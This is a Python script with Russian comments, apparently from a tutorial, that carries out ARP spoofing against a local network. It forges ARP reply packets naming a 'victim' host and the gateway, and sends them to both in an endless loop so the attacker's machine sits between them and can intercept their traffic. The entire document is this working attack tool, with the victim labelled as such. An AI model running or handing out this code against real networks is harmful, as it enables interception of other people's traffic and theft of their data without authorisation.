import socket
import time

interface = "wlan0"  # Прослушиваемый сетевой интерфейс
mac = b"\xbb\xbb\xbb\xbb\xbb\xbb"  # Наш MAC-адрес, он же bb:bb:bb:bb:bb:bb

gateway_ip = socket.inet_aton("192.168.1.1")  # IP-адрес шлюза
gateway_mac = b"\xaa\xaa\xaa\xaa\xaa\xaa"  # MAC-адрес шлюза

victim_ip = socket.inet_aton("192.168.1.2")  # IP-адрес жертвы
victim_mac = b"\xcc\xcc\xcc\xcc\xcc\xcc"  # MAC-адрес жертвы

connect = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
connect.bind((interface, socket.htons(0x0800)))

arp_code = b'\x08\x06'  # Код протокола
htype = b'\x00\x01'  # Hardware Type
ptype = b'\x08\x00'  # Protocol Type
hlen = b'\x06'  # Hardware Length
plen = b'\x04'  # Protocol Length
operation = b'\x00\x02'  # Operation Code - Ответ

protocol = htype + ptype + hlen + plen + operation  # Собранное тело

# Две части пакетов ниже указывают от кого, кому и по какому протоколу отсылать данные
eth_packet_1 = victim_mac + mac + arp_code
eth_packet_2 = gateway_mac + mac + arp_code

# Окончательные пакеты для жертвы и шлюза
# 4 переменные после протокола это 4 последних значения из спойлера, которые мы не разобрали
request_victim = eth_packet_1 + protocol + mac + gateway_ip + victim_mac + victim_ip
request_gateway = eth_packet_2 + protocol + mac + victim_ip + gateway_mac + gateway_ip

# Отправка поддельных пакетов
while True:
    connect.send(request_victim)
    connect.send(request_gateway)
    time.sleep(1)